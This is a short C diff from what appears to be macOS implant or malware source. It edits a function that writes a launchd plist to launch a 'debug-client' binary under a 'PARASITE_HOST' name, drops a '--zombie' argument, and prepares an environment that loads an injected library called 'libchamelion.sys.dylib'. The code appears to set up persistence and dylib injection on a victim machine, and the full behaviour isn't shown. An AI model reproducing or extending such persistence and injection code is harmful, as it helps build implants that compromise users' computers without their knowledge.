@@ -53,6 +53,8 @@ int main(int argc, const char * argv[]) {
     return 0;
 }
 
+
+
 void silence_output(int fdIn, int fdOut) {
     dup2(fdIn, STDIN_FILENO);
     dup2(fdOut, STDOUT_FILENO);
@@ -128,14 +130,13 @@ void create_launch_plist(void) {
     CFURLRef output_url = CFURLCreateWithFileSystemPath(kCFAllocatorDefault, output_string, kCFURLPOSIXPathStyle, false);
     CFRelease(output_string);
     free(output);
-    CFStringRef arguments[3];
+    CFStringRef arguments[2];
     arguments[0] = CFSTR(PARASITE_HOST);
     char *metastasys_executable = convert_bin_path("debug-client");
     CFStringRef metastasys_executable_str = CFStringCreateWithCString(kCFAllocatorDefault, metastasys_executable, kCFStringEncodingASCII);
     free(metastasys_executable);
     arguments[1] = metastasys_executable_str;
-    arguments[2] = CFSTR("--zombie");
-    CFArrayRef arguments_array = CFArrayCreate(kCFAllocatorDefault, (const void **)arguments, 3, &kCFTypeArrayCallBacks);
+    CFArrayRef arguments_array = CFArrayCreate(kCFAllocatorDefault, (const void **)arguments, 2, &kCFTypeArrayCallBacks);
     CFMutableDictionaryRef mutable_env_dict = CFDictionaryCreateMutable(kCFAllocatorDefault, 0, &kCFTypeDictionaryKeyCallBacks, &kCFTypeDictionaryValueCallBacks);
     char *chamelion_lib = convert_bin_path("libchamelion.sys.dylib");
     CFStringRef chamelion_lib_str = CFStringCreateWithCString(kCFAllocatorDefault, chamelion_lib, kCFStringEncodingASCII);
